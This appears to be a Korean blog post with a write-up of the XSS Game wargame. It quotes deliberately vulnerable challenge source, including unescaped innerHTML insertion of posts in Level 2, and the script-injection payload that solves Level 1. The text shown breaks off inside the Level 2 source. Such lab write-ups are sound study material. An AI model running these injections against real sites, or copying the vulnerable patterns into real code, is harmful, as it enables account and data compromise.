<!DOCTYPE html>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@100;300;400;500;700;900&display=swap"
    rel="stylesheet">

<html class="no-js">
<head>
    <meta charset="utf-8">

    <base href="https://mingzz1.github.io/">
    <title> mingzzi&#39;s blog </title>
    <meta name="description" content="mingzzi&#39;s blog">

    <link rel="canonical" href="https://mingzz1.github.io/wargame/xss-game/2018/06/27/xssgame-writeup.html/">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />

    
    <link rel="stylesheet" href="https://mingzz1.github.io/sass/main.min.94d6e676b5b11c22f591951fd9b4e6ab0f6a3179daac45918d1fbc53ed631f00.css">

    <link rel="shortcut icon" href="https://mingzz1.github.io/img/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" type="text/css"
        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">


    <script src="https://code.jquery.com/jquery-1.12.4.min.js"
        integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>

    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-130304424-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'UA-130304424-1');
    </script>

    
    <script data-ad-client="ca-pub-1587587893565234" async
        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

    <script>
        $(function () {
            $(".cat1>li").click(function () {
                $(this).siblings().find('ul').slideUp(300);
                $(this).find('ul').slideToggle(300);
            })

            $(window).scroll(function () {
                activeBg();
            });

            activeBg();


            $('.h-menu').click(function (e) {
                e.preventDefault();
                $('.side').addClass('on');
            });

            $('.close').click(function (e) {
                e.preventDefault();
                $('.side').removeClass('on');
            });

            $('ul.slide>li').click(function () {
                if ($(this).find('.down').hasClass('on')) {
                    $(this).find('.down').removeClass('on');
                    $(this).find('.down').prev().stop().slideUp(500);
                } else {
                    $(this).find('.down').addClass('on');
                    $(this).find('.down').prev().stop().slideDown(500);
                }
            })
        })

        function activeBg() {
            if ($(window).scrollTop() > 0) {
                $('.site-header').addClass('on');
            } else {
                $('.site-header').removeClass('on');
            }
        }

    </script>
</head>
<header class="site-header">
    <h1 class="web-t" onclick="window.location.href='/'"><span>def</span><em> 천방지축 얼렁뚱땅
        </em><span>(</span><i>🤣</i><span>)</span>:<br />
        &nbsp;&nbsp;&nbsp;&nbsp;<span class="nbsp">title =</span> 빙글빙글 돌아가는 우당탕탕 시큐로그
        <br />
    </h1>

    <h1 class="mob-t" onclick="window.location.href='/'">
        <span>천/얼/빙/돌(</span><i>🤣</i><span>)</span>
        <br />우당탕탕 시큐로그
    </h1>

    <nav>
        <div class="h-menu">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="side">
            <div class="close">
                <span></span>
                <span></span>
            </div>
            <ul class="slide">
                <li class="on"><a href="#">All Post</a>
                </li>
                <li><a>Pentesting</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//pentesting/ios">iOS</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/android">Android</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/web">Web</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/cloud">Cloud</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Wargame</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//wargame/lord-of-sql-injection">Lord of SQL Injection</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/pwnable.kr">Pwnable.kr</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/wargame.kr">Wargame.kr</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/xss-game">XSS Game</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/owasp">OWASP-MSTG Crackmes</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>CTF</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//ctf/2018">2018</a></li>
                        <li><a href="https://mingzz1.github.io//ctf/2019">2019</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Error</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//error/linux">Linux</a></li>
                        <li><a href="https://mingzz1.github.io//error/windows">Windows</a></li>
                        <li><a href="https://mingzz1.github.io//error/python">Python</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Development</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//development/basic">Basic</a></li>
                        <li><a href="https://mingzz1.github.io//development/web">Web</a></li>
                        <li><a href="https://mingzz1.github.io//development/mobile">Mobile</a></li>
                        <li><a href="https://mingzz1.github.io//development/database">Database</a></li>
                        <li><a href="https://mingzz1.github.io//development/docker">Docker</a></li>
                        <li><a href="https://mingzz1.github.io//development/github-blog">Github Blog</a></li>
                        <li><a href="https://mingzz1.github.io//development/secure-coding">Secure Coding</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <hr />
                <li><a href="https://mingzz1.github.io//about">About</a></li>
                <li><a href="https://mingzz1.github.io//archive">Archive</a></li>
                <li><a href="https://mingzz1.github.io//tags">Tag</a></li>
            </ul>
        </div>
    </nav>
</header>

<body>
    <div class="content">
        
        

<article>
    <header>
        <h1 class="title">[XSS Game] Write up</h1>
        <p class="meta">
            2018-06-27
        </p>
    </header>
    <section class="post-content"><p>우연히 <code>XSS Game</code>이라는 워게임 사이트를 알게 되었다.
<code>XSS</code> 문제만 모여 있는 사이트인데, 총 6문제가 있고, 다양한 방식으로 XSS 공격을 수행할 수 있어 처음 XSS를 공부하는 사람들이 접하기에 좋은 사이트인 것 같다.</p>
<p><code>XSS Game</code>은 플래그를 인증하는 방식이 아니라, <code>alert</code>를 띄우면 된다.
6단계를 거치면서 필터링이 추가되는 방식이 아니라 공격 벡터가 모두 다르도록 되어있고, 각 문제별로 3~4개 정도의 힌트가 주어진다.
모든 문제는 <code>iframe</code>으로 제공되며, 마우스 오른쪽 버튼 클릭 후 <code>프레임 소스 보기</code>를 선택하면 문제의 소스코드를 볼 수 있다.
또한 소스 보기에서 <code>view=source:</code>를 지우면 해당 프레임 페이지에서 직접 시도할 수 있다.
xss-game 내에서는 URL을 조작하려 하니 자꾸 <code>setImmediate</code>로 바뀌어서 프레임 페이지로 직접 이동 해 문제를 푼 후 해당 URL을 그대로 문제로 가져오는 방식으로 문제를 풀이했다.</p>
<p>문제 사이트는 아래와 같다.</p>
<blockquote>
<p><a href="http://xss-game.appspot.com/">http://xss-game.appspot.com/</a></p>
</blockquote>
<p>문제에 처음 접속하면 다음과 같이 화면이 뜨는데, 초록색 버튼을 누르면 첫 번째 단계를 시작할 수 있다.</p>
<p><img src="/images/xssgame/xssgame_01.PNG" alt=""></p>
<hr>
<h2 id="level-1">Level 1</h2>
<p>첫 번째 문제이다.</p>
<p><img src="/images/xssgame/xssgame_02.PNG" alt=""></p>
<p>소스코드는 아래와 같다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level1&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level1.png&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">div</span>&gt;
      &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;GET&#34;</span>&gt;
        &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;query&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;query&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Enter query here...&#34;</span> <span style="color:#50fa7b">onfocus</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;this.value=&#39;&#39;&#34;</span>&gt;
        &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button&#34;</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Search&#34;</span>&gt;
      &lt;/<span style="color:#ff79c6">form</span>&gt;
    &lt;/<span style="color:#ff79c6">div</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>어떤 특정 입력 값을 받는데, 값을 입력하면 입력한 값이 그대로 출력된다.
<code>aa</code>를 입력 한 경우 아래와 같다.</p>
<p><img src="/images/xssgame/xssgame_03.PNG" alt=""></p>
<p><img src="/images/xssgame/xssgame_04.PNG" alt=""></p>
<p>따라서 별다른 필터링이 없다면 입력 창에 스크립트 코드를 삽입 해 XSS 공격을 유발할 수 있다. 
입력 창에 <code>&lt;script&gt; alert(1); &lt;/script&gt;</code>를 입력 해 보았다.
그 결과 Level 1을 클리어 할 수 있었다.</p>
<p><img src="/images/xssgame/xssgame_05.PNG" alt=""></p>
<hr>
<h2 id="level-2">Level 2</h2>
<p>Level 2는 댓글 달기 기능과 유사한 기능이 구현되어 있다.</p>
<p><img src="/images/xssgame/xssgame_06.PNG" alt=""></p>
<p>내가 입력한 텍스트가 그대로 보이기 때문에 Level 1과 동일하게 <code>&lt;script&gt; alert(1); &lt;/script&gt;</code>를 입력 해 보았으나, 동작하지 않았다.
소스코드를 살펴보면 다음과 같다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;

    <span style="color:#6272a4">&lt;!-- This is our database of messages --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/post-store.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
  
    &lt;<span style="color:#ff79c6">script</span>&gt;
      <span style="color:#8be9fd;font-style:italic">var</span> defaultMessage <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Welcome!&lt;br&gt;&lt;br&gt;This is your &lt;i&gt;personal&lt;/i&gt;&#34;</span>
        <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; stream. You can post anything you want here, especially &#34;</span>
        <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&lt;span style=&#39;color: #f00ba7&#39;&gt;madness&lt;/span&gt;.&#34;</span>;

      <span style="color:#8be9fd;font-style:italic">var</span> DB <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> PostDB(defaultMessage);

      <span style="color:#8be9fd;font-style:italic">function</span> displayPosts() {
        <span style="color:#8be9fd;font-style:italic">var</span> containerEl <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;post-container&#34;</span>);
        containerEl.innerHTML <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;

        <span style="color:#8be9fd;font-style:italic">var</span> posts <span style="color:#ff79c6">=</span> DB.getPosts();
        <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">var</span> i<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; i<span style="color:#ff79c6">&lt;</span>posts.length; i<span style="color:#ff79c6">++</span>) {
          <span style="color:#8be9fd;font-style:italic">var</span> html <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&lt;table class=&#34;message&#34;&gt; &lt;tr&gt; &lt;td valign=top&gt; &#39;</span>
            <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;&lt;img src=&#34;/static/level2_icon.png&#34;&gt; &lt;/td&gt; &lt;td valign=top &#39;</span>
            <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39; class=&#34;message-container&#34;&gt; &lt;div class=&#34;shim&#34;&gt;&lt;/div&gt;&#39;</span>;

          html <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;&lt;b&gt;You&lt;/b&gt;&#39;</span>;
          html <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;&lt;span class=&#34;date&#34;&gt;&#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>(posts[i].date) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;&lt;/span&gt;&#39;</span>;
          html <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;blockquote&gt;&#34;</span> <span style="color:#ff79c6">+</span> posts[i].message <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&lt;/blockquote&gt;&#34;</span>;
          html <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#34;</span>
          containerEl.innerHTML <span style="color:#ff79c6">+=</span> html; 
        }
      }

      <span style="color:#8be9fd;font-style:italic">window</span>.onload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>() { 
        <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;clear-form&#39;</span>).onsubmit <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>() {
          DB.clear(<span style="color:#8be9fd;font-style:italic">function</span>() { displayPosts() });
          <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
        }

        <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;post-form&#39;</span>).onsubmit <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>() {
          <span style="color:#8be9fd;font-style:italic">var</span> message <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;post-content&#39;</span>).value;
          DB.save(message, <span style="color:#8be9fd;font-style:italic">function</span>() { displayPosts() } );
          <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;post-content&#39;</span>).value <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
          <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
        }

        displayPosts();
      }

    &lt;/<span style="color:#ff79c6">script</span>&gt;

  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level2&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;header&#34;</span>&gt;
      &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level2.png&#34;</span> /&gt; 
      &lt;<span style="color:#ff79c6">div</span>&gt;Chatter from across the Web.&lt;/<span style="color:#ff79c6">div</span>&gt;
      &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;clear-form&#34;</span>&gt;
        &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;clear&#34;</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Clear all posts&#34;</span>&gt;
      &lt;/<span style="color:#ff79c6">form</span>&gt;
    &lt;/<span style="color:#ff79c6">div</span>&gt;

    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post-container&#34;</span>&gt;&lt;/<span style="color:#ff79c6">div</span>&gt;

    &lt;<span style="color:#ff79c6">table</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;message&#34;</span>&gt;
      &lt;<span style="color:#ff79c6">tr</span>&gt;
        &lt;<span style="color:#ff79c6">td</span> <span style="color:#50fa7b">valign</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;top&#34;</span>&gt;
          &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/level2_icon.png&#34;</span>&gt;
        &lt;/<span style="color:#ff79c6">td</span>&gt;
        &lt;<span style="color:#ff79c6">td</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;message-container&#34;</span>&gt;
          &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;shim&#34;</span>&gt;&lt;/<span style="color:#ff79c6">div</span>&gt;
